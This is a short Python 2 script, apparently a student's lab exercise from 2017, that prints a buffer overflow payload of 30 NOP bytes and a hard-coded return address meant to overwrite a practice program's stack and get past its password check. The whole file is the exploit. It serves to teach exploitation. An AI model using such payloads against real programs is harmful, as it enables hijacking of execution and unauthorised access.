#By Hrishikesh N - AM.EN.P2CSN16008
#Feb 3 2017
#program to overwrite addresses in the buffer overflow program

#the original password is : 0000000000

print '\x90' * 30 + '\x0e\x85\x04\x08'

#0x0804850e
